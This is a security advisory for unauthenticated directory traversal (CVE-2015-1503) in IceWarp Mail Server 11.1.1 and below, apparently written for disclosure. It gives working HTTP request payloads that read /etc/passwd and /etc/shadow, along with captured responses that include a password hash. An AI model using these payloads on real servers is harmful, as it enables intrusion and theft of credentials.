@@ -1,0 +1,119 @@
+Vendor: IceWarp (http://www.icewarp.com)
+Product: IceWarp Mail Server
+Version affected: 11.1.1 and below
+
+Product description: 
+IceWarp WebMail provides web-based access to email, calendars, contacts, files and shared data from any computer with a browser and Internet connection.
+IceWarp Mail Server is a commercial mail and groupware server developed by IceWarp Ltd. It runs on Windows and Linux.
+
+Finding 1: Multiple Unauthenticated Directory traversal
+Credit: Piotr Karolak of Trustwave's SpiderLabs
+CVE: CVE-2015-1503
+CWE: CWE-22
+
+#Proof of Concept
+
+The unauthenticated Directory Traversal vulnerability can be exploited by
+issuing a specially crafted HTTP GET request to the
+/webmail/client/skins/default/css/css.php. Directory Traversal is a
+vulnerability which allows attackers to access restricted directories and
+execute commands outside of the web server's root directory.
+
+This vulnerability affects /-.._._.--.._1416610368(variable, depending on
+the installation, need to check page
+source)/webmail/client/skins/default/css/css.php.
+
+Attack details
+URL GET input file was set to ../../../../../../../../../../etc/passwd
+
+Proof-of-Concept:
+
+The GET or POST request might be sent to the host A.B.C.D where the IceWarp mail server is running:
+
+REQUEST
+=======
+GET /-.._._.--.._1416610368/webmail/client/skins/default/css/css.php?file=../../../../../../../../../../etc/passwd&palette=default&skin=default HTTP/1.1
+Referer: http://a.b.c.d/
+Cookie: PHPSESSID_BASIC=wm-54abaf5b3eb4d824333000; use_cookies=1; lastLogin=en%7Cbasic; sess_suffix=basic; basic_disable_ip_check=1; lastUsername=test; language=en
+Host: a.b.c.d
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+Accept: */*
+
+
+RESPONSE:
+=========
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+
+....TRUNCATED
+
+test:x:1000:1000:test,,,:/home/test:/bin/bash 
+smmta:x:116:125:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false 
+smmsp:x:117:126:Mail Submission Program,,,:/var/lib/sendmail:/bin/false 
+mysql:x:118:127:MySQL Server,,,:/nonexistent:/bin/false 
+
+The above proof-of-concept would retrieve the /etc/passwd file (the
+response in this example has been truncated).
+
+#Proof of Concept
+
+The unauthenticated Directory Traversal vulnerability can be exploited by
+issuing a specially crafted HTTP GET and POST request payload
+..././..././..././..././..././..././..././..././..././..././etc/shadow
+submitted in the script and/or style parameter.  Directory Traversal is a
+vulnerability which allows attackers to access restricted directories and
+execute commands outside of the web server's root directory.
+
+The script and style parameters are vulnerable to path traversal attacks,
+enabling read access to arbitrary files on the server.
+
+REQUEST 1
+=========
+
+GET /webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fshadow HTTP/1.1
+Host: a.b.c.d
+Accept: */*
+Accept-Language: en
+Connection: close
+Referer: http://a.b.c.d/webmail/old/calendar/index.html?_n[p][content]=event.main&_n[p][main]=win.main.public&_n[w]=main
+Cookie: use_cookies=1; PHPSESSID_LOGIN=08dj6q5s8tlmn126fo3vg80n47; sess_suffix=basic; lastUsername=test; PHPSESSID_CALENDAR=ji3306tg3fecg1foun2ha6dnu1; GUI=advanced; LANG=TURKISH; PHPSESSID_BASIC=wm-54a5b90472921449948637; lastLogin=en%7Cpda; prefered_version=0; PHPSESSID_PDA=ji3306tg3fecg1foun2ha6dnu1; language=en
+
+REQUEST 2
+=========
+
+GET /webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fshadow HTTP/1.1
+Host: a.b.c.d
+Accept: */*
+Accept-Language: en
+Connection: close
+Cookie: use_cookies=1; PHPSESSID_LOGIN=08dj6q5s8tlmn126fo3vg80n47; sess_suffix=basic; lastUsername=test; PHPSESSID_CALENDAR=ji3306tg3fecg1foun2ha6dnu1; GUI=advanced; LANG=TURKISH; PHPSESSID_BASIC=wm-54a5b90472921449948637; lastLogin=en%7Cpda; prefered_version=0; PHPSESSID_PDA=ji3306tg3fecg1foun2ha6dnu1; language=en
+
+RESPONSE
+========
+HTTP/1.1 200 OK
+Connection: close
+Server: IceWarp/11.1.1.0
+Date: Thu, 03 Jan 2015 06:44:23 GMT
+Content-type: text/javascript; charset=utf-8
+
+root:!:16436:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+games:*:16273:0:99999:7:::
+man:*:16273:0:99999:7:::
+lp:*:16273:0:99999:7:::
+
+....TRUNCATED
+
+lightdm:*:16273:0:99999:7:::
+colord:*:16273:0:99999:7:::
+hplip:*:16273:0:99999:7:::
+pulse:*:16273:0:99999:7:::
+test:$1$Duuk9PXN$IzWNTK/hPfl2jzhHmnrVL.:16436:0:99999:7:::
+smmta:*:16436:0:99999:7:::
+smmsp:*:16436:0:99999:7:::
+mysql:!:16436:0:99999:7:::
